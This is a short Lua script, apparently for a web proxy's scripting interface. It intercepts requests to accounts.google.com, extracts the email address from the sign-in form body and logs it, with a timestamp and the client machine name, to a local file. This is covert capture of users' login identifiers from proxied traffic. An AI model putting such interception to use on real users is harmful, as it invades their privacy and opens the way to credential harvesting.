  if ProxyAPIObject:GetRequestHeaderValue("Host") == "accounts.google.com" then

    local requestBody = ProxyAPIObject:GetRequestBody()
     i, j = string.find(requestBody, "Email=")
     if i == nil or j == nil then
       return
     end
      if i > -1   then
         local subRequestBody = requestBody:sub(j + 1)         
         k, l = subRequestBody:find('%&')
         if k == nil then
           return
         end
         if k > -1 then 
                local required = subRequestBody:sub(0 ,k-1) 
                if string.len(required) == 0 then
                return 
                end
                local msg = "\n" .. ProxyAPIObject:GetDateTime() .. "\t" .. required .. " attempts for signing into Gmail from " .. ProxyAPIObject:GetClientName() 
                  ProxyAPIObject:WriteToFile("E:\\gmaillogin.txt", msg)
           end    
      end       
  end
